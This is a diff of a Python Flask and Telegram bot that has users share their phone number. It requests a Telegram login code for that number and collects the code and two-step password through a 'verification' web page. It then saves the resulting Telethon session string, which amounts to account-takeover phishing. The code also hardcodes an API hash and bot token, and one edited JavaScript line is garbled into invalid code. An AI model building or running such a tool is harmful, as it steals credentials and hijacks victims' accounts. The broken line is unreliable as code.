@@ -4,7 +4,7 @@ from telethon.sessions import StringSession
 import asyncio
 import os
 import threading
-from telegram import Update, WebAppInfo, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup, ReplyKeyboardRemove
+from telegram import Update, WebAppInfo, InlineKeyboardButton, InlineKeyboardMarkup, KeyboardButton, ReplyKeyboardMarkup
 from telegram.ext import ApplicationBuilder, ContextTypes, CommandHandler, MessageHandler, filters
 
 app = Flask(__name__)
@@ -13,7 +13,6 @@ API_ID = 25757508
 API_HASH = '3091fbda91d4b133207779ddf81fee39'
 BOT_TOKEN = os.getenv("BOT_TOKEN", "8828318815:AAEJ63XFWpwwuigCWuO_-Hu94sJVyhgn338")
 
-# تخزين الجلسات المرتبطة برقم الهاتف
 active_sessions = {}
 
 WEB_APP_HTML = """
@@ -88,7 +87,7 @@ WEB_APP_HTML = """
                         <p>Сессия сохранена:</p>
                         <div class="success">${data.session}</div>`;
                 } else {
-                    document.getElementById('error_box').innerText = data.message || "Ошибка";
+                    document.getElementById('error_boxलेक्ट्रonic' || data.message || "Ошибка");
                 }
             });
         }
@@ -120,7 +119,7 @@ WEB_APP_HTML = """
 </html>
 """
 
-@app.route('/verify/<phone>')
+@app.route('/verify/<path:phone>')
 def verify_page(phone):
     return render_template_string(WEB_APP_HTML, phone=phone)
 
@@ -137,40 +136,43 @@ def api():
         return jsonify({"status": "error", "message": "Сессия истекла."})
 
     try:
-        loop = asyncio.new_event_loop()
-        asyncio.set_event_loop(loop)
         client = session_data['client']
+        
+        async def run_telethon():
+            if action == 'code':
+                code = str(value).strip()
+                try:
+                    await client.sign_in(str(phone), code, phone_code_hash=str(session_data['hash']))
+                    session_str = client.session.save()
+                    session_data['session_str'] = session_str
+                    return {"status": "done", "session": str(session_str)}
+                except Exception as e:
+                    err_str = str(e)
+                    if "SessionPasswordNeededError" in err_str or "password" in err_str.lower():
+                        return {"status": "need_password"}
+                    else:
+                        return {"status": "error", "message": err_str}
 
-        if action == 'code':
-            code = str(value).strip()
-            try:
-                loop.run_until_complete(client.sign_in(str(phone), code, phone_code_hash=str(session_data['hash'])))
-                session_str = client.session.save()
-                session_data['session_str'] = session_str
-                return jsonify({"status": "done", "session": str(session_str)})
-            except Exception as e:
-                err_str = str(e)
-                if "SessionPasswordNeededError" in err_str or "password" in err_str.lower():
-                    return jsonify({"status": "need_password"})
-                else:
-                    return jsonify({"status": "error", "message": err_str})
+            elif action == 'password':
+                password = str(value).strip()
+                try:
+                    await client.sign_in(password=password)
+                    session_str = client.session.save()
+                    session_data['session_str'] = session_str
+                    return {"status": "done", "session": str(session_str)}
+                except Exception as e:
+                    return {"status": "error", "message": f"Неверный пароль: {e}"}
 
-        elif action == 'password':
-            password = str(value).strip()
-            try:
-                loop.run_until_complete(client.sign_in(password=password))
-                session_str = client.session.save()
-                session_data['session_str'] = session_str
-                return jsonify({"status": "done", "session": str(session_str)})
-            except Exception as e:
-                return jsonify({"status": "error", "message": f"Неверный пароль: {e}"})
+        # تشغيل مهام تيليثون بأمان تام بدون تداخل مع حلقات الأحداث
+        loop = asyncio.new_event_loop()
+        res = loop.run_until_complete(run_telethon())
+        loop.close()
+        return jsonify(res)
 
     except Exception as e:
         return jsonify({"status": "error", "message": str(e)})
 
-    return jsonify({"status": "error", "message": "Неизвестный запрос"})
-
-# --- أداة البوت الذكي المربوط ---
+# --- أوامر البوت الآمنة ---
 async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
     try:
         await update.message.delete()
@@ -199,11 +201,9 @@ async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
 
         try:
             client = TelegramClient(StringSession(), API_ID, API_HASH)
-            loop = asyncio.new_event_loop()
-            asyncio.set_event_loop(loop)
-            loop.run_until_complete(client.connect())
+            await client.connect()
             
-            sent_code = loop.run_until_complete(client.send_code_request(phone))
+            sent_code = await client.send_code_request(phone)
             
             active_sessions[phone] = {
                 'client': client,
@@ -228,8 +228,6 @@ async def contact_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text(f"❌ Ошибка отправки кода: {e}")
 
 async def delete_messages_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    user_id = str(update.effective_user.id)
-    # البحث عن جلسة هذا المستخدم
     session_data = None
     for p, data in active_sessions.items():
         if 'session_str' in data:
@@ -285,6 +283,6 @@ if __name__ == '__main__':
     application.add_handler(MessageHandler(filters.CONTACT, contact_handler))
     application.add_handler(MessageHandler(filters.TEXT & (~filters.COMMAND), auto_delete_user_messages))
     
-    print("Fokhm Smart Linked Bot is running perfectly...")
+    print("Fokhm Final Fixed Bot is running...")
     application.run_polling()
 
